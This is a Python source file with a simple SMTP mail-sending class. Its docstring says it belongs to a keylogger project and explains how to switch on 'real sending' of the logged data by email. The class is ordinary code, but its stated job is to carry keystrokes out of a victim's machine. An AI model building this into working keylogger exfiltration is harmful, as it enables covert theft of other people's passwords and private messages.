import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


class MailSender:
    """
    Lightweight SMTP wrapper.
    By default we keep the sending logic commented in Keylogger to stay SAFE.
    You can enable real sending by using this class and uncommenting the call.
    """

    def __init__(self, email, password, smtp_server="smtp.gmail.com", port=587):
        self.email = email
        self.password = password
        self.smtp_server = smtp_server
        self.port = int(port)

    def send_mail(self, to_email, subject, body):
        """Send a plain-text email."""
        # Print so you can see what's being sent (good for debugging even if you enable real sending)
        print(f"[SMTP] Connecting to {self.smtp_server}:{self.port} as {self.email}")
        server = smtplib.SMTP(self.smtp_server, self.port)
        server.starttls()
        server.login(self.email, self.password)

        msg = MIMEMultipart()
        msg["From"] = self.email
        msg["To"] = to_email
        msg["Subject"] = subject
        msg.attach(MIMEText(body or "(no content)", "plain"))

        server.sendmail(self.email, to_email, msg.as_string())
        server.quit()
        print("[SMTP] Email sent.")
